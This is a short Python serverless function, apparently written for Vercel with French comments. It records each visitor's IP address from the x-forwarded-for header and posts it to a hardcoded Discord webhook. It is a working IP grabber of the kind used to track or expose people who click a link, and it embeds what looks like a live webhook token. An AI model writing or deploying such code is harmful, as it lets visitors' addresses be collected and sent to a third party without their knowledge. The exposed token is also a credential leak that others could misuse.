import json
import requests

# Ton Webhook Discord
webhook_url = "https://discord.com/api/webhooks/1338289805330485269/HWNiUL4_apZL2n3c9qJxxieUQiqKKOgsVROl3Lsgl9QcCwVoWsAcxy1ndbLKSnCrPoEw"

# Fonction handler pour Vercel
def handler(request):
    try:
        # Récupère l'IP du client
        client_ip = request.headers.get('x-forwarded-for', 'IP non trouvée')

        # Envoie l'IP au webhook Discord
        requests.post(webhook_url, json={"content": f"🌐 Nouvelle IP détectée : {client_ip}"})

        # Réponse pour le client
        return {
            "statusCode": 200,
            "body": json.dumps({"message": "IP logged successfully."})
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "body": json.dumps({"error": str(e)})
        }
